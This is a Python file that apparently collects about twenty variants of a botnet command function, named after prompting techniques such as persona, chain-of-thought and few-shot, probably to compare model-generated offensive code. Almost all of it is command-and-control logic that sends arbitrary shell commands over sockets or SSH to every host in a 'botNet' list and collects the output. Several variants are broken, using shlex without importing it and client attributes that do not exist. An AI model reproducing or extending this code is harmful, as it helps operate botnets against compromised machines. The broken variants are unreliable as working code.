from pexpect import pxssh
import paramiko
import socket
import logging

class Client:

    def __init__(self, host, port):
        self.addr = (host, port)
        self.host = host
        
    def send_command(self, command):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect(self.addr)
            s.sendall(command.encode())
            try:
                data = s.recv(4096)
                return data.decode()
            except socket.timeout:
                pass

# Lista botNet
botNet = [
    Client("bot", 9999),
]

def ground_truth_code_botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print(f"Output from {client.addr}:{output}")

def persona_botnetCommand(command):
    for client in botNet:
        try:
            output = client.send_command(command)
            if output:
                print(f'[+] Output from {client.host}: {output}')
            else:
                print(f'[-] No output from {client.host}')
        except Exception as e:
            print(f'[-] Error executing command on {client.host}: {e}')

def template_botnetCommand(command):
    if not isinstance(command, str):
        raise ValueError("Command must be a string")
    results = []
    try:
        if 'botNet' in globals():
            for client in botNet:
                if hasattr(client, 'send_command'):
                    result = client.send_command(command)
                    results.append(result)
                else:
                    raise AttributeError("Client object does not have method 'send_command'")
        else:
            raise NameError("Global variable 'botNet' not found")
    except Exception as e:
        raise RuntimeError(f"An error occurred while executing commands on the botnet: {e}")
    print(f"Output from {client.addr}: {results}")

def question_refinement_botnetCommand(command):
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    if not isinstance(command, str):
        raise ValueError("The command must be a string")
    logging.info('Starting execution of command on botnet')
    for client in botNet:
        if client.session is None:
            logging.warning(f'Skipping a client due to login failure')
            continue
        safe_command = shlex.split(command)
        try:
            client.session.sendline(' '.join(safe_command))
            client.session.prompt()
            output = client.session.before.decode('utf-8')
            print(f'Output from {client.session}: {output}')
        except Exception as e:
            logging.error(f'Error during command execution on client {client.session}: {e}')
    logging.info('Completed execution of command on botnet')

def alternative_approaches_botnetCommand(command):
    import logging
    logging.basicConfig(level=logging.INFO)
    if not isinstance(command, str) or not command.strip():
        logging.error('[-] Invalid command provided. Command must be a non-empty string.')
        return
    for client in botNet:
        try:
            output = client.send_command(command)
            print(f'[*] Output from {client.host}: [+] {output}')
        except Exception as e:
            logging.error(f'[-] Failed to execute command on {client.host}')
            logging.error(f'[-] Error: {str(e)}')

def context_manager_botnetCommand(command):
    for client in botNet:
        try:
            output = client.send_command(command)
            print(f'Output from {client.host}: {output}')
        except Exception as e:
            print(f'[-] Error with client {client.host}: {str(e)}')

def flipped_interaction_3_botnetCommand(command):
    outputs = []
    for client in botNet:
        try:
            output = client.send_command(command)
            outputs.append(output)
            print(f"Output from {client.addr}: {output}")
        except Exception as e:
            print(f'Error executing command on {client.host}: {e}')
            outputs.append(None)
    return outputs

def flipped_interaction_4_botnetCommand(command):
    results = {}
    for client in botNet:
        try:
            response = client.send_command(command)
            results[client.host] = response
            print(f"Output from {client.addr}: {response}")
        except Exception as e:
            results[client.host] = f"Error: {str(e)}"
    return results

def flipped_interaction_5_botnetCommand(command):
    results = {}
    for client in botNet:
        try:
            output = client.send_command(command)
            results[client.host] = output
            print(f"Output from {client.addr}: {output}")
        except Exception as e:
            print(f"Error executing command on {client.host}: {e}")
            results[client.host] = None
    return results

def iterative_prompting_3_botnet_command(command):
    if not isinstance(command, str):
        raise ValueError("Command must be a string.")
    for client in botNet:
        try:
            output = client.send_command(command)
            print(f"[*] Output from {client.host}")
            print(f"[+] {output}")
        except Exception as e:
            print(f"[-] Failed to send command to {client.host}: {e}")

def iterative_prompting_4_botnet_command(command):
    if not isinstance(command, str) or not command.strip():
        raise ValueError("Command must be a non-empty string.")
    for client in botNet:
        try:
            if not hasattr(client, 'send_command'):
                raise AttributeError(f"Client {client} does not have 'send_command' method.")
            output = client.send_command(command)
            print(f"Output from {client.host}:")
            print(output)
        except AttributeError as attr_err:
            print(f"Attribute error for client {getattr(client, 'host', 'unknown')}: {attr_err}")
        except Exception as e:
            print(f"Error executing command on {getattr(client, 'host', 'unknown')}: {e}")

def iterative_prompting_5_botnet_command(command):
    if not isinstance(command, str):
        raise ValueError("Command must be a string.")
    for client in botNet:
        try:
            output = client.send_command(command)
            print(f"[*] Output from {client.host}")
            print(f"[+] {output}")
        except Exception as e:
            print(f"[-] Failed to send command to {client.host}: {e}")

def few_shots_prompting_botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print(f"Output from {client.host}: {output}")

def cot_prompting_botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print(f'Output from {client.host}:\n{output}\n')

def fact_check_list_botnetCommand(command):
    for client in botNet:
        try:
            output = client.send_command(command)
            print(f"Output from {client.host}:{output}")
        except Exception as e:
            print(f"Error executing command on {client.host}: {str(e)}")

def not_interactive_mix_botnetCommand(command):
    if not isinstance(command, str):
        raise ValueError('Command must be a string')
    if len(command.strip()) == 0:
        raise ValueError('Command cannot be empty')
    results = []
    for client in botNet:
        try:
            response = client.send_command(command)
            results.append({'host': client.host, 'response': response})
        except Exception as e:
            results.append({'host': client.host, 'error': str(e)})
    print(f"Output from {client.addr}: {results}")

def interactive_mix_execute_command_on_clients(command):
    import subprocess
    import logging
    from shlex import quote
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    results = {}
    for client in botNet:
        if 'user' not in client or 'host' not in client:
            logging.error('Each client must have both user and host keys')
            results[client.get('host', 'unknown')] = {
                'success': False,
                'error': 'Invalid client data'
            }
            continue
        try:
            safe_command = quote(command)
            completed_process = subprocess.run(
                ['ssh', f"{client['user']}@{client['host']}", safe_command],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=10
            )
            results[client['host']] = {
                'success': True,
                'output': completed_process.stdout.decode('utf-8')
            }
            logging.info(f"Command executed successfully on {client['host']}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Command failed on {client['host']}: {e.stderr.decode('utf-8')}")
            results[client['host']] = {
                'success': False,
                'error': e.stderr.decode('utf-8')
            }
        except subprocess.TimeoutExpired:
            logging.error(f"Command on {client['host']} timed out.")
            results[client['host']] = {
                'success': False,
                'error': 'Timeout expired'
            }
        except Exception as e:
            logging.error(f"Unexpected error on {client['host']}: {str(e)}")
            results[client['host']] = {
                'success': False,
                'error': 'Unexpected error'
            }
    return results

def baseline_botnetCommand(command):
    global botNet
    for client in botNet:
        output = client.send_command(command)
        print(f'Host: {client.host} Output: {output}')

